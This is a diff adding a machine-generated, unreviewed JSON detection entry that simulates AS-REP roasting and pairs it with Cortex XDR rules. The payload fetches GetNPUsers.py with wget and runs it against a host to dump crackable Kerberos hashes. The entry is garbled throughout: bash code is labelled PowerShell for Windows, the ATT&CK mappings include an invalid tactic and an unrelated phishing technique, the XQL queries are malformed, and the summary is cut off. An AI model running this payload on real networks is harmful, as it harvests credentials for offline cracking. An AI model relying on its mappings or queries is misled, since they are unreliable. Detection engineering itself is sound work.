@@ -1,0 +1,185 @@
+{
+  "id": "TTP-0000-0103",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Kerberos Pre-Auth Failures via AS-REP Roasting",
+    "summary": "An attacker uses a tool like GetNPUsers.py to request AS-REP responses from Kerberos for users without pre-authentication, then cracks the response offline. Cortex detects this through unusual Kerbero",
+    "description": "An attacker uses a tool like GetNPUsers.py to request AS-REP responses from Kerberos for users without pre-authentication, then cracks the response offline. Cortex detects this through unusual Kerberos pre-auth failure patterns."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1586",
+        "name": "T1586",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1078",
+        "name": "Valid Accounts",
+        "tactic_ids": [
+          "TA0008",
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Lateral Movement",
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1566",
+        "name": "Phishing",
+        "tactic_ids": [
+          "TA0001"
+        ],
+        "tactic_names": [
+          "Initial Access"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "wget -O /tmp/GetNPUsers.py https://raw.githubusercontent.com/ropnop/kerbrute/master/GetNPUsers.py\n\ncat > /tmp/attack_script.sh << 'EOF'\n#!/bin/bash\npython3 /tmp/GetNPUsers.py 192.0.2.100/ -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep_hashes.txt\nEOF\n\nchmod +x /tmp/attack_script.sh\n/tmp/attack_script.sh\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Execution of GetNPUsers.py",
+        "expected_value": "action_process_image_name = 'python3' and actor_process_image_name = 'bash'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Connection to domain controller for Kerberos AS-REQ",
+        "expected_value": "action_remote_ip = '192.0.2.100' and dst_port = 88"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Kerberos AS-REP Failure by Host",
+        "description": "Detects multiple failed Kerberos AS-REP requests from a single host",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_CONNECTION\n| filter action_remote_ip = '192.0.2.100' and dst_port = 88 and action_process_image_name = 'python3'\n| comp count() as cnt by agent_hostname\n| comp count() as cnt by > 5",
+        "mitre_technique_ids": [
+          "T1586",
+          "T1078"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Kerberos Pre-Auth Failure Pattern",
+        "description": "Detects unusual Kerberos pre-authentication failures from a single host in a short time window",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_CONNECTION\n| filter action_remote_ip = '192.0.2.100' and dst_port = 88\n| comp count() as cnt by agent_hostname\n| comp count() as cnt by > 3\n| comp 1m",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "action_remote_ip = '192.0.2.100' and dst_port = 88",
+        "mitre_technique_ids": [
+          "T1586",
+          "T1078"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Kerberos AS-REP Failure Hunt",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_CONNECTION\n| filter action_remote_ip = '192.0.2.100' and dst_port = 88\n| comp count() as cnt by agent_hostname\n| comp count() as cnt by > 5",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Kerberos Pre-Auth Failures by Host; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/kerberos-pre-auth-failures-by-host"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Kerberos Pre-Auth Failures by Host",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/kerberos-pre-auth-failures-by-host",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1586",
+      "url": "https://attack.mitre.org/techniques/T1586/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1078",
+      "url": "https://attack.mitre.org/techniques/T1078/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1566",
+      "url": "https://attack.mitre.org/techniques/T1566/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
